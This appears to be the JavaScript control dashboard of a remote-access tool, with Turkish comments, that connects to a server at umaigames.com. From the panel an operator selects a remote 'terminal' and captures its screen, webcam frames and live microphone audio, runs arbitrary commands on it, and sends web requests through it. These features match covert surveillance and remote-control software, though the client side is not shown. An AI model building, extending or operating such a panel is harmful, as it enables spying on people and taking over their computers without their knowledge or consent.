var info = {
  // UZAK SUNUCU İÇİN (umaigames.com - Electron ile aynı):
  host: "umaigames.com", // Electron ile aynı host kullanılmalı
  port: 80,
  
  // YEREL TEST İÇİN:
  // host: "localhost",
  // port: 3011,
  
  dashboardId: new Date().getTime() + "-" + Math.floor(Math.random() * 99999),
};

// Şifre koruması kontrolü - Sadece şifre doğru girildiyse bağlan
var socket = null;

// Connection status güncelleme fonksiyonu
function updateConnectionStatus(connected, message) {
  const statusEl = document.getElementById("connectionStatus");
  if (!statusEl) return;
  
  if (connected) {
    statusEl.className = "badge bg-success";
    statusEl.textContent = "✅ " + (message || "Bağlandı");
  } else {
    statusEl.className = "badge bg-danger";
    statusEl.textContent = "❌ " + (message || "Bağlantı yok");
  }
}

function initializeSocket() {
  // Eğer zaten bağlanmışsa tekrar bağlanma
  if (socket && socket.connected) {
    return;
  }
  
  /**
   * IMPORTANT:
   * - Electron app gibi açıkça HTTP kullanıyoruz (http://umaigames.com:80)
   * - Reverse proxy (Nginx/Apache) SSL termination yapıyorsa, Node.js server'a HTTP üzerinden bağlanır
   * - Mixed Content hatası olmaması için reverse proxy'nin doğru yapılandırılması gerekir
   */

  var socketOptions = {
    forceNew: true,
    transports: ["polling", "websocket"],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    maxReconnectionAttempts: 5,
    timeout: 20000,
  };

  // Electron app gibi açıkça HTTP kullan (reverse proxy SSL termination yapıyor olabilir)
  var portPart = info.port ? ":" + info.port : "";
  var socketUrl = "http://" + info.host + portPart;
  
  console.log("🔌 Socket bağlantısı deneniyor:", socketUrl);
  updateConnectionStatus(false, "Bağlanıyor...");
  socket = io.connect(socketUrl, socketOptions);
  
  setupSocketEvents();
}

function setupSocketEvents() {
  if (!socket) return;
 
  // Loglama için URL bilgisi (Electron app gibi HTTP kullanıyoruz)
  var socketUrl = "http://" + info.host + (info.port ? ":" + info.port : "");

  // Bağlantı başarılı
  socket.on("connect", function() {
    console.log("=".repeat(50));
    console.log("✅ Web Socket bağlantısı başarılı");
    console.log("🔌 Socket ID:", socket.id);
    console.log("🌐 Sunucu:", socketUrl);
    console.log("📋 Dashboard ID:", info.dashboardId);
    console.log("=".repeat(50));
    
    // Connection status güncelle
    updateConnectionStatus(true, "Bağlandı");
  });

  // Bağlantı hatalarını yakala
  socket.on("connect_error", function(error) {
    console.error("❌ Socket bağlantı hatası:", error.message);
    console.error("Sunucuya bağlanılamıyor:", socketUrl);
    console.error("Hata detayı:", error);
    
    var errorMsg = "Bağlantı hatası";
    
    if (error.message.includes("Bad request")) {
      console.error("💡 'Bad request' hatası genellikle Socket.IO versiyon uyumsuzluğu veya transport sorunudur.");
      console.error("💡 Sunucunun Socket.IO v4 kullandığından emin olun.");
      errorMsg = "Bad request - Versiyon uyumsuzluğu";
    } else if (error.message.includes("timeout") || error.message.includes("xhr poll error")) {
      console.error("💡 Bağlantı zaman aşımı - Sunucu çalışmıyor olabilir veya port kapalı.");
      console.error("💡 Kontrol edin:");
      console.error("   1. Sunucu çalışıyor mu? (cd web/server && node server.js)");
      console.error("   2. Port açık mı?");
      console.error("   3. Firewall portu engelliyor mu?");
      if (info.host === "umaigames.com") {
        console.error("   4. umaigames.com sunucusunda port açık mı?");
        console.error("   5. Reverse proxy (Nginx/Apache) yapılandırması doğru mu?");
        console.error("   6. CORS ayarları doğru mu? (Sunucuda origin: '*' olmalı)");
        console.error("   7. Tarayıcı console'da CORS hatası var mı?");
      }
      errorMsg = "Zaman aşımı - Sunucu erişilemiyor";
    } else if (error.message.includes("CORS")) {
      console.error("💡 CORS hatası - Sunucuda CORS ayarlarını kontrol edin.");
      console.error("💡 Sunucuda cors: { origin: '*' } olmalı.");
      errorMsg = "CORS hatası";
    }
    
    // Mixed content (HTTP->HTTPS) hatası kontrolü
    var isMixedContent = error.message.includes("Mixed Content") || 
        (window.location.protocol === "https:" && socketUrl.includes("http://"));
    
    if (isMixedContent) {
      console.error("💡 MIXED CONTENT HATASI TESPİT EDİLDİ!");
      console.error("💡 HTTPS sayfadan HTTP Socket.IO'ya bağlanılamıyor.");
      console.error("💡 Çözüm:");
      console.error("   1. Reverse proxy (Nginx/Apache) WSS (WebSocket Secure) desteği ekleyin");
      console.error("   2. Socket.IO sunucusunu HTTPS üzerinden erişilebilir yapın");
      console.error("   3. Veya dashboard'ı HTTP üzerinden yükleyin");
      errorMsg = "Mixed Content - HTTPS/HTTP uyumsuzluğu";
    }
    
    updateConnectionStatus(false, errorMsg);
  });

  socket.on("connect_timeout", function() {
    console.error("⏱️ Socket bağlantı zaman aşımı");
    updateConnectionStatus(false, "Bağlantı zaman aşımı");
  });
  
  // Socket event'leri - connect event
  socket.on("connect", function () {
    console.log(socket.id);
    socket.emit("joinToRoom", { roomName: "dashboard-" + info.dashboardId });
  });

  socket.on("disconnect", function () {
    console.log("Disconnected !");
    updateConnectionStatus(false, "Bağlantı kesildi");
  });

  socket.on("screenshotResponse", function (data) {
    !!data.src ? console.log('+') : console.log('-');

    if (data.src && data.src.length > 0) {
      $(".listOfScreensAndWindows").html(
        '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
        data.src +
        "></div>"
      );
      // Otomatik refresh - sadece eğer hala aynı screen seçiliyse
      const currentScreen = $("#screenSelect").val();
      if (currentScreen && currentScreen !== "") {
        setTimeout(() => {
          // Sadece hala aynı screen seçiliyse devam et
          if ($("#screenSelect").val() === currentScreen) {
            getScreenshot();
          }
        }, 1000); // 1 saniye sonra bir sonraki frame
      }
    } else {
      // Hata durumunda veya boş response
      console.error("Empty screenshot response");
      $(".listOfScreensAndWindows").html(
        '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><div class="text-center text-danger p-5">Failed to get screenshot</div></div>'
      );
    }
  });

  socket.on("camShotResponse", function (data) {
    $(".listOfScreensAndWindows").html(
      '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
      data.src +
      "></div>"
    );
  });

  socket.on("camBinary", function (data) {
    const blob = new Blob([data.data], { type: 'image/jpeg' });
    const url = URL.createObjectURL(blob);
    $(".listOfScreensAndWindows").html(
      '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src="' + url + '"></div>'
    );
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });

  socket.on("audioStreamResponse", function (data) {
    console.log("🎵 Audio stream response received from server");
    
    if (data.audioData) {
      console.log("🎵 Audio chunk received:", data.audioData.length, "chars (base64)");
      
      try {
        const binaryString = atob(data.audioData);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
          bytes[i] = binaryString.charCodeAt(i);
        }
        
        let mimeType = 'audio/webm';
        if (data.mimeType) {
          mimeType = data.mimeType;
        }
        
        const blob = new Blob([bytes], { type: mimeType });
        const url = URL.createObjectURL(blob);
        
        if (currentAudioUrl) {
          URL.revokeObjectURL(currentAudioUrl);
        }
        
        currentAudioUrl = url;
        
        const audioElement = document.getElementById("audioStream");
        audioElement.src = url;
        audioElement.volume = 1.0;
        audioElement.muted = false;
        audioElement.preload = "auto";
        
        audioElement.play().then(() => {
          console.log("✅ Audio playing successfully");
        }).catch(e => {
          console.error("❌ Audio play error:", e);
        });
        
      } catch (error) {
        console.error("❌ Error processing audio data:", error);
      }
    }
  });

  socket.on("audioListenStatus", function (data) {
    const statusText = document.getElementById("audioStatusText");
    
    if (data.status === "started") {
      statusText.textContent = "Listening (high sensitivity)...";
      statusText.className = "text-success";
    } else if (data.status === "stopped") {
      statusText.textContent = "Stopped";
      statusText.className = "text-muted";
    } else if (data.status === "error") {
      statusText.textContent = "Error: " + data.error;
      statusText.className = "text-danger";
    }
  });

  socket.on("getRunResponse", function (data) {
    console.log({ getRunResponse: data });
    $(".cmdArea").text(data.cmd);
  });

  // Remote Browser - Ekran görüntüsü gösterimi
  socket.on("remoteBrowserFrame", function (data) {
    console.log("📥 [WEB] remoteBrowserFrame received, src length:", data.src ? data.src.length : 0);
    if (!data.src) {
      console.error("❌ [WEB] remoteBrowserFrame has no src!");
      return;
    }

    const img = document.getElementById("remoteBrowserImage");
    const placeholder = document.getElementById("remoteBrowserPlaceholder");
    
    if (img) {
      img.src = data.src;
      if (placeholder) placeholder.style.display = "none";
      console.log("✅ [WEB] remoteBrowserFrame displayed");
    } else {
      console.error("❌ [WEB] remoteBrowserImage element not found!");
    }
  });

  // HTTP Request Response - Ekran görüntüsü gösterimi
  socket.on("httpResponseFrame", function (data) {
    console.log("📥 [WEB] httpResponseFrame received, src length:", data.src ? data.src.length : 0, "status:", data.status);
    if (!data.src) {
      console.error("❌ [WEB] httpResponseFrame has no src!");
      return;
    }

    const img = document.getElementById("httpResponseImage");
    const placeholder = document.getElementById("httpResponsePlaceholder");
    
    if (img) {
      img.src = data.src;
      if (placeholder) placeholder.style.display = "none";
      console.log("✅ [WEB] httpResponseFrame displayed");
    } else {
      console.error("❌ [WEB] httpResponseImage element not found!");
    }
  });

  // Screen listesi response
  socket.on("getScreenListResponse", function (data) {
    const select = $("#screenSelect");
    const currentScreenId = select.find("option:selected").data("id"); // Mevcut seçimin ID'sini sakla
    
    select.empty();
    
    if (data.screens && data.screens.length > 0) {
      // İlk seçenek olarak "Select a screen/window..." ekle
      select.append('<option value="">-- Select a screen/window --</option>');
      
      data.screens.forEach((screen, index) => {
        const isScreen = screen.id.startsWith("screen:") || screen.id.startsWith("Screen");
        const label = screen.name || (isScreen ? `Screen ${index + 1}` : screen.name);
        const type = isScreen ? 'screen' : 'window';
        // Value olarak screen.id kullan (index değil)
        select.append(`<option value="${screen.id}" data-type="${type}" data-name="${screen.name}">${label}</option>`);
      });
      
      // Eğer mevcut seçim hala geçerliyse onu koru
      if (currentScreenId) {
        const matchingOption = select.find(`option[value="${currentScreenId}"]`);
        if (matchingOption.length > 0) {
          select.val(currentScreenId);
          // Mevcut seçim varsa screenshot al (kullanıcı daha önce seçmişti)
          setTimeout(() => {
            getScreenshot();
          }, 100);
        } else {
          // Mevcut seçim artık yok - boş bırak
          select.val("");
        }
      } else {
        // Yeni liste yüklendi, seçim yok - boş bırak, screenshot alma
        select.val("");
      }
    } else {
      select.append('<option value="">No screens/windows found</option>');
    }
  });
}

// Audio URL için global değişken
let currentAudioUrl = null;

function getScreenshot() {
  if (!socket || !socket.connected) {
    console.error("Socket not connected, cannot get screenshot");
    return;
  }
  
  const screenSelect = $("#screenSelect");
  const screenId = screenSelect.val();
  const screenName = screenSelect.find("option:selected").data("name");
  
  if (!screenId || screenId === "") {
    console.error("No screen selected");
    return;
  }
  
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    screenId: screenId, // Screen ID (doğrudan ID kullan)
    screenName: screenName, // Screen name (opsiyonel, debug için)
    dimension: $(".screen").val(), // Max width: 1280, max height: 720
  };
  
  console.log("Requesting screenshot for screen ID:", screenId, "Name:", screenName);
  socket.emit("screenshotRequest", data);
}

function getCamShot(one = false) {
  if (!socket || !socket.connected) return;
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    screen: $(".select").val(),
    dimension: $(".screen").val(), // Max width: 1280, max height: 720
    one,
  };
  socket.emit("camShotRequest", data);
}

function startAudioListen() {
  if (!socket || !socket.connected) return;
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    action: "start"
  };
  socket.emit("audioListenRequest", data);
}

function stopAudioListen() {
  if (!socket || !socket.connected) return;
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    action: "stop"
  };
  socket.emit("audioListenRequest", data);
  
  // Audio URL'yi temizle
  if (currentAudioUrl) {
    URL.revokeObjectURL(currentAudioUrl);
    currentAudioUrl = null;
  }
  
  // Audio element'i temizle
  const audioElement = document.getElementById("audioStream");
  audioElement.src = "";
  
  console.log("🔇 Audio stream stopped and cleaned up (2s intervals)");
}

$(document).ready(function () {
  if (localStorage.getItem("terminalId")) {
    $(".terminalId").val(localStorage.getItem("terminalId"));
  }
  
  // Otomatik screen listesi yükleme kaldırıldı
  // Kullanıcı selectbox'a tıklayınca yüklenecek
});

$(document).on("change", ".terminalId", function () {
  localStorage.setItem("terminalId", $(this).val());
  // Terminal değiştiğinde screen listesini yenile
  loadScreenList();
});

// Dinamik screen/window listesi
function loadScreenList() {
  if (!socket || !socket.connected) {
    console.error("Socket not connected, cannot load screen list");
    return;
  }
  
  const terminalId = $(".terminalId").val();
  if (!terminalId) {
    console.error("Terminal ID is empty");
    return;
  }
  
  const data = {
    from: "terminal-" + terminalId,
    to: "dashboard-" + info.dashboardId,
  };
  
  console.log("Loading screen list for terminal:", terminalId);
  socket.emit("getScreenListRequest", data);
}

// Screen selectbox'a tıklayınca veya focus olunca listeyi yükle
$(document).on("click focus", "#screenSelect", function () {
  const select = $(this);
  // Eğer sadece placeholder varsa veya hiç seçenek yoksa yükle
  if (select.find("option").length <= 1 || select.find("option[value='']").length > 0 && select.find("option").length === 1) {
    select.html('<option value="">Loading screens...</option>');
    loadScreenList();
  }
});

// Screen değiştiğinde önceki ekranı temizle ve yeni screenshot al
$(document).on("change", "#screenSelect", function () {
  const selectedValue = $(this).val();
  if (!selectedValue || selectedValue === "") {
    // Seçim kaldırıldıysa ekranı temizle
    $(".listOfScreensAndWindows").html('<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><div class="text-center text-muted p-5">No screen selected</div></div>');
    return;
  }
  
  // Önceki ekranı temizle
  $(".listOfScreensAndWindows").html('<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><div class="text-center text-muted p-5">Loading screen...</div></div>');
  
  // Yeni screenshot isteği gönder
  setTimeout(() => {
    getScreenshot();
  }, 100);
});

$(document).on("click", ".screenshotBtn", function () {
  getScreenshot();
});

$(document).on("click", ".camShotBtn", function () {
  getCamShot();
});

$(document).on("click", ".oneCamShotBtn", function () {
  getCamShot(true);
});

$(document).on("click", ".startListenBtn", function () {
  console.log("Start Listen button clicked");
  startAudioListen();
});

$(document).on("click", ".stopListenBtn", function () {
  console.log("🛑 Stop Listen button clicked");
  stopAudioListen();
});


function getRun() {
  if (!socket || !socket.connected) return;
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    cmd: $(".cmd").val(),
  };
  socket.emit("getRunRequest", data);
}

$(document).on("click", ".runBtn", function () {
  getRun();
});

/**
 * Remote Browser - Ekran görüntüsü yaklaşımı
 */
function openRemoteBrowser() {
  if (!socket) {
    console.error("❌ [WEB] Socket not initialized");
    alert("Socket bağlantısı başlatılamadı! Lütfen sayfayı yenileyin.");
    return;
  }
  
  if (!socket.connected) {
    console.error("❌ [WEB] Socket not connected. Connection state:", socket.connected, "Socket ID:", socket.id);
    alert("Socket bağlantısı yok! Lütfen bağlantıyı kontrol edin ve sayfayı yenileyin.\n\nBağlantı durumu: " + (socket.connected ? "Bağlı" : "Bağlı değil"));
    return;
  }

  const url = $(".remoteBrowserUrl").val().trim();
  if (!url) {
    alert("Lütfen bir URL girin!");
    return;
  }

  let finalUrl = url;
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    finalUrl = "https://" + url;
  }

  const terminalId = $(".terminalId").val();
  if (!terminalId) {
    alert("Lütfen Application ID seçin!");
    return;
  }

  const data = {
    from: "terminal-" + terminalId,
    to: "dashboard-" + info.dashboardId,
    url: finalUrl,
  };

  console.log("📤 [WEB] Emitting remoteBrowserOpen:", data);
  console.log("📤 [WEB] Socket connected:", socket.connected, "Socket ID:", socket.id);
  console.log("📤 [WEB] Target room:", data.from);

  const placeholder = document.getElementById("remoteBrowserPlaceholder");
  if (placeholder) {
    placeholder.style.display = "flex";
    placeholder.innerHTML = '<span class="text-info">Loading...</span>';
  }

  socket.emit("remoteBrowserOpen", data);
  
  // Timeout kontrolü - 10 saniye sonra hala yanıt gelmezse uyar
  setTimeout(() => {
    if (placeholder && placeholder.style.display !== "none") {
      placeholder.innerHTML = '<span class="text-warning">Timeout - Yanıt bekleniyor... Socket bağlantısını kontrol edin.</span>';
      console.warn("⏱️ [WEB] remoteBrowserOpen timeout - no response after 10 seconds");
    }
  }, 10000);
}

/**
 * HTTP Request - Terminal üzerinden HTTP isteği gönder
 */
function sendHttpRequest() {
  if (!socket) {
    console.error("❌ [WEB] Socket not initialized");
    alert("Socket bağlantısı başlatılamadı! Lütfen sayfayı yenileyin.");
    return;
  }
  
  if (!socket.connected) {
    console.error("❌ [WEB] Socket not connected. Connection state:", socket.connected, "Socket ID:", socket.id);
    alert("Socket bağlantısı yok! Lütfen bağlantıyı kontrol edin ve sayfayı yenileyin.\n\nBağlantı durumu: " + (socket.connected ? "Bağlı" : "Bağlı değil"));
    return;
  }

  const method = $("#httpMethod").val();
  const url = $("#httpUrl").val().trim();
  
  if (!url) {
    alert("Lütfen bir URL girin!");
    return;
  }

  let finalUrl = url;
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    finalUrl = "https://" + url;
  }

  const terminalId = $(".terminalId").val();
  if (!terminalId) {
    alert("Lütfen Application ID seçin!");
    return;
  }

  // Headers parse et
  let headers = {};
  const headersText = $("#httpHeaders").val().trim();
  if (headersText) {
    try {
      headers = JSON.parse(headersText);
    } catch (e) {
      alert("Headers JSON formatında olmalı!");
      return;
    }
  }

  // Body parse et
  let body = null;
  const bodyText = $("#httpBody").val().trim();
  if (bodyText && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
    try {
      body = JSON.parse(bodyText);
    } catch (e) {
      // JSON değilse string olarak gönder
      body = bodyText;
    }
  }

  const data = {
    from: "terminal-" + terminalId,
    to: "dashboard-" + info.dashboardId,
    method: method,
    url: finalUrl,
    headers: headers,
    body: body
  };

  console.log("📤 [WEB] Emitting httpRequest:", data.method, data.url);
  console.log("📤 [WEB] Socket connected:", socket.connected, "Socket ID:", socket.id);
  console.log("📤 [WEB] Target room:", data.from);

  const placeholder = document.getElementById("httpResponsePlaceholder");
  if (placeholder) {
    placeholder.style.display = "flex";
    placeholder.innerHTML = '<span class="text-info">Sending request...</span>';
  }

  socket.emit("httpRequest", data);
  
  // Timeout kontrolü - 15 saniye sonra hala yanıt gelmezse uyar
  setTimeout(() => {
    if (placeholder && placeholder.style.display !== "none") {
      placeholder.innerHTML = '<span class="text-warning">Timeout - Yanıt bekleniyor... Socket bağlantısını kontrol edin.</span>';
      console.warn("⏱️ [WEB] httpRequest timeout - no response after 15 seconds");
    }
  }, 15000);
}


// Remote browser Open butonu
$(document).on("click", ".remoteBrowserOpenBtn", function () {
  openRemoteBrowser();
});

// HTTP Request Send butonu
$(document).on("click", ".httpRequestBtn", function () {
  sendHttpRequest();
});

// Test audio function
function testAudio() {
  console.log("🧪 Testing audio element...");
  const audioElement = document.getElementById("audioStream");
  
  // Audio element durumunu kontrol et
  console.log("Audio element:", audioElement);
  console.log("Audio src:", audioElement.src);
  console.log("Audio volume:", audioElement.volume);
  console.log("Audio muted:", audioElement.muted);
  console.log("Audio readyState:", audioElement.readyState);
  console.log("Audio networkState:", audioElement.networkState);
  
  // Test sesi çal - basit beep sesi
  const audioContext = new (window.AudioContext || window.webkitAudioContext)();
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  oscillator.frequency.setValueAtTime(440, audioContext.currentTime); // A note
  gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
  
  oscillator.start(audioContext.currentTime);
  oscillator.stop(audioContext.currentTime + 0.5);
  
  console.log("🔊 Test beep sound played");
  
  // Socket bağlantısını test et
  console.log("🔌 Socket connected:", socket.connected);
  console.log("🔌 Socket id:", socket.id);
}
